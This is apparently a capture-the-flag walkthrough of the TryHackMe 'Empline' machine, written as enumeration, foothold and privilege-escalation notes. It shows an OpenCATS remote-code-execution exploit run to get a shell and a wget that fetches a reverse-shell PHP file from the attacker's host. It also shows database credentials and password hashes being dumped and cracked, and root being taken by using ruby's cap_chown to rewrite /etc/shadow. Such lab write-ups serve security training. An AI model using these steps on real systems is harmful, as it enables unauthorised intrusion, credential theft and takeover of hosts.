# Box Name

## Empline

## Overview
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---
### nmap
```bash
Nmap scan report for 10.10.134.66
Host is up, received user-set (0.14s latency).
Scanned at 2021-09-17 17:50:56 CDT for 11s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c0:d5:41:ee:a4:d0:83:0c:97:0d:75:cc:7b:10:7f:76 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDR9CEnxhm89ZCC+SGhOpO28srSTnL5lQtnqd4NaT7hTT6N1NrRZQ5DoB6cBI+YlaqYe3I4Ud3y7RF3ESms8L21hbpQus2UYxbWOl+/s3muDpZww1nvI5k9oJguQaLG1EroU8tee7yhPID0+285jbk5AZY72pc7NLOMLvFDijArOhj9kIcsPLVTaxzQ6Di+xwXYdiKO0F3Y7GgMMSszIeigvZEDhNnNW0Z1puMYbtTgmvJH6LpzMSEC+32iNRGlvbjebE9Ehh+tGiOuHKXT1uexrt7gbkjp3lJteV5034a7G1t/Vi3JJoj9tMV/CrvgeDDncbT5NNaSA6/ynLLENqSP
|   256 83:82:f9:69:19:7d:0d:5c:53:65:d5:54:f6:45:db:74 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFhf+BTt0YGudpgOROEuqs4YuIhT1ve23uvZkHhN9lYSpK9WcHI2K5IXIi+XgPeSk/VIQLsRUA0kOqbsuoxN+u0=
|   256 4f:91:3e:8b:69:69:09:70:0e:82:26:28:5c:84:71:c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDkr5yXgnawt7un+3Tf0TJ+sZTrbVIY0TDbitiu2eHpf
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Empline
3306/tcp open  mysql   syn-ack MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
|   Thread ID: 87
|   Capabilities flags: 63487
|   Some Capabilities: IgnoreSigpipes, Support41Auth, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, ODBCClient, SupportsLoadDataLocal, SupportsCompression, InteractiveClient, FoundRows, SupportsTransactions, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, LongColumnFlag, LongPassword, ConnectWithDatabase, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: kv1/8l7j5f%$"~x\G,F[
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### html source
- #### view html source find s subdomain add to /etc/hosts
	-  job.empline.thm
	- also find two possible usernames
		- James Gynja and George Tasa
```html
<!-- ***** Menu Start ***** -->
                        <ul class="nav">
                            <li class="scroll-to-section"><a href="[#welcome](view-source:http://10.10.135.204/#welcome)" class="menu-item">Home</a></li>
                            <li class="scroll-to-section"><a href="[#about](view-source:http://10.10.135.204/#about)" class="menu-item">About</a></li>
                            <li class="scroll-to-section"><a href="[#testimonials](view-source:http://10.10.135.204/#testimonials)" class="menu-item">Testimonials</a>
                            <li class="scroll-to-section"><a href="[http://job.empline.thm/careers](view-source:http://job.empline.thm/careers)" class="menu-item">Employment</a>
                            </li>
                            <li class="scroll-to-section"><a href="[#contact-us](view-source:http://10.10.135.204/#contact-us)" class="menu-item">Contact Us</a></li>
                        </ul>
                        <a class='menu-trigger'>
                            <span>Menu</span>
                        </a>
                        <!-- ***** Menu End ***** -->

<h4>James Gynja</h4>
		<p>“Morbi non mi luctus felis molestie scelerisque. In ac libero viverra, placerat est
			interdum, rhoncus leo.”</p>
		<span>Web Analyst</span>
<h4>George Tasa</h4>
		<p>“Fusce rutrum in dolor sit amet lobortis. Ut at vehicula justo. Donec quam dolor,
			congue a fringilla sed, maximus et urna.”</p>
		<span>System Admin</span>
```

### navigate to job.empline.thm get a login page for an OpenCATS support forum
![](Pasted%20image%2020230917192320.png)

### searchsploit
```bash
┌──(kn1ght㉿Kali)-[~/THM/empline]
└─$ searchsploit OpenCats  
--------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------

OpenCATS 0.9.4 - Remote Code Execution (RCE)                     | php/webapps/50585.sh                                                                                                                                           
OpenCats 0.9.4-2 - 'docx ' XML External Entity Injection (XXE)   | php/webapps/50316.py                                                                                                                                       
--------------------------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results
Papers: No Results
```
-  find 2 possible exploits for OpenCats
	- the first exploit gets shell as www-data
	```bash
	┌──(kn1ght㉿Kali)-[~/THM/empline]
└─$ bash 50585.sh http://job.empline.thm             
 _._     _,-'""`-._ 
(,-.`._,'(       |\`-/|        RevCAT - OpenCAT RCE
    `-.-' \ )-`( , o o)         Nicholas  Ferreira
          `-    \`_`"'-   https://github.com/Nickguitar

[*] Attacking target http://job.empline.thm
[*] Checking CATS version...
[*] Version detected: 0.9.4
[*] Creating temp file with payload...
[*] Checking active jobs...
[+] Jobs found! Using job id 1
[*] Sending payload...
[+] Payload Zyr9O.php uploaded!
[*] Deleting created temp file...
[*] Checking shell...
[+] Got shell! :D
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux empline 4.15.0-147-generic #151-Ubuntu SMP Fri Jun 18 19:21:19 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ ls -la /home
total 16
drwxr-xr-x  4 root   root   4096 Jul 20  2021 .
drwxr-xr-x 24 root   root   4096 Sep 17 23:43 ..
drwxrwx---  4 george george 4096 Sep 18 00:00 george
drwxr-xr-x  3 ubuntu ubuntu 4096 Jul 20  2021 ubuntu

$ 
```

-  used exploit to upload a better revshell
```bash

$ pwd
/var/www/opencats/upload/careerportaladd

$ wget http://10.11.38.90/rev.php

```

![](Pasted%20image%2020230917194727.png)

![](Pasted%20image%2020230917194920.png)

---
## Initial Foothold
---
```bash
(remote) www-data@empline:/var/www/opencats$ ls -la
total 476
drwxrwxr-x 23 www-data www-data  4096 Jul 20  2021 .
drwxr-xr-x  4 root     root      4096 Jul 20  2021 ..
-rw-rw-r--  1 www-data www-data  1684 May  3  2017 .travis.yml
-rw-rw-r--  1 www-data www-data 65537 May  3  2017 CHANGELOG.MD
-rwxrwxr-x  1 www-data www-data   328 May  3  2017 Error.tpl
-rw-r--r--  1 www-data www-data   104 Jul 20  2021 INSTALL_BLOCK
-rw-rw-r--  1 www-data www-data 43229 May  3  2017 LICENSE.md
-rwxrwxr-x  1 www-data www-data  3577 May  3  2017 QueueCLI.php
-rw-rw-r--  1 www-data www-data  1778 May  3  2017 README.md
drwxrwxr-x  2 www-data www-data  4096 May  3  2017 ajax
-rw-rw-r--  1 www-data www-data  3476 May  3  2017 ajax.php
drwxrwx---  2 www-data www-data  4096 Jul 20  2021 attachments
drwxrwxr-x  2 www-data www-data  4096 May  3  2017 careers
-rwxrwxr-x  1 www-data www-data  2916 May  3  2017 careersPage.css
drwxrwxr-x  2 www-data www-data  4096 May  3  2017 ci
drwxrwxr-x  7 www-data www-data  4096 May  3  2017 ckeditor
-rw-rw-r--  1 www-data www-data   395 May  3  2017 composer.json
-rw-rw-r--  1 www-data www-data 97210 May  3  2017 composer.lock
-rwxrwxr-x  1 www-data www-data 14505 Jul 20  2021 config.php
-rw-rw-r--  1 www-data www-data 10518 May  3  2017 constants.php
drwxrwxr-x  2 www-data www-data  4096 May  3  2017 db
drwxrwxr-x  2 www-data www-data  4096 May  3  2017 docker
-rwxrwxr-x  1 www-data www-data  1041 May  3  2017 ie.css
drwxrwxr-x 11 www-data www-data 12288 May  3  2017 images

```

- check the config.php file found login creds for mysql
```bash
/* Database configuration. */
define('DATABASE_USER', 'james');
define('DATABASE_PASS', 'ng6pUFvsGNtw');
define('DATABASE_HOST', 'localhost');
define('DATABASE_NAME', 'opencats');

```

- logged into nysql

```bash
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| opencats           |
+--------------------+
2 rows in set (0.00 sec)
```

```bash
MariaDB [opencats]> show tables;
+--------------------------------------+
| Tables_in_opencats                   |
+--------------------------------------+
| access_level                         |
| activity                             |
| activity_type                        |
| attachment                           |
| calendar_event                       |
| calendar_event_type                  |
| candidate                            |
| candidate_joborder                   |
| candidate_joborder_status            |
| candidate_joborder_status_history    |
| candidate_jobordrer_status_type      |
| candidate_source                     |
| candidate_tag                        |
| career_portal_questionnaire          |
| career_portal_questionnaire_answer   |
| career_portal_questionnaire_history  |
| career_portal_questionnaire_question |
| career_portal_template               |
| career_portal_template_site          |
| company                              |
| company_department                   |
| contact                              |
| data_item_type                       |
| eeo_ethnic_type                      |
| eeo_veteran_type                     |
| email_history                        |
| email_template                       |
| extension_statistics                 |
| extra_field                          |
| extra_field_settings                 |
| feedback                             |
| history                              |
| http_log                             |
| http_log_types                       |
| import                               |
| installtest                          |
| joborder                             |
| module_schema                        |
| mru                                  |
| queue                                |
| saved_list                           |
| saved_list_entry                     |
| saved_search                         |
| settings                             |
| site                                 |
| sph_counter                          |
| system                               |
| tag                                  |
| user                                 |
| user_login                           |
| word_verification                    |
| xml_feed_submits                     |
| xml_feeds                            |
| zipcodes                             |
+--------------------------------------+
54 rows in set (0.00 sec)
```

```bash
MariaDB [opencats]> select user_name,password from user;
+----------------+----------------------------------+
| user_name      | password                         |
+----------------+----------------------------------+
| admin          | b67b5ecc5d8902ba59c65596e4c053ec |
| cats@rootadmin | cantlogin                        |
| george         | 86d0dfda99dbebc424eb4407947356ac |
| james          | e53fbdb31890ff3bc129db0e27c473c9 |
+----------------+----------------------------------+
4 rows in set (0.01 sec)
```

- know have user names and password hashes
	- used crackstation.ne to crack hashes

# only one of them was cracked
#### which belonged to george
	
![](Pasted%20image%2020230917202816.png)

---

## Privilege Escalation
----
## ssh in as george
```bash 
              
┌──(kn1ght㉿Kali)-[~/THM/empline]
└─$ ssh george@empline.thm

The authenticity of host 'empline.thm (10.10.135.204)' can't be established.
ED25519 key fingerprint is SHA256:Zy2CJ55rf4XCqfOlavd68DrxEEE51RIMUi0ps+yk6Tc.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:228: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'empline.thm' (ED25519) to the list of known hosts.
george@empline.thm's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Sep 18 01:31:30 UTC 2023

  System load:  0.17              Processes:           104
  Usage of /:   4.9% of 38.71GB   Users logged in:     0
  Memory usage: 40%               IP address for eth0: 10.10.135.204
  Swap usage:   0%


28 updates can be applied immediately.
7 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Sep 18 00:00:09 2023 from 10.11.38.90
george@empline:~$ id
uid=1002(george) gid=1002(george) groups=1002(george)
george@empline:~$ 

```

### manually search for common privesc' found ruby had cap_chown set
```bash
george@empline:~$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/local/bin/ruby = cap_chown+ep
```

```bash
george@empline:~$ id
uid=1002(george) gid=1002(george) groups=1002(george)
george@empline:~$ ruby -e 'require "fileutils"; FileUtils.chown(1002, 1002, "/etc/shadow")'
george@empline:~$ ls -la /etc/shadow
-rw-r----- 1 george george 1017 Sep 18 01:55 /etc/shadow
george@empline:~$ openssl passwd -1 password1
$1$AKEnc/QK$38uPMLJlugJ3K8HSMmjjG/
george@empline:~$ vim /etc/shadow
george@empline:~$ su -l root
Password: 
root@empline:~# id
uid=0(root) gid=0(root) groups=0(root)
root@empline:~# 
```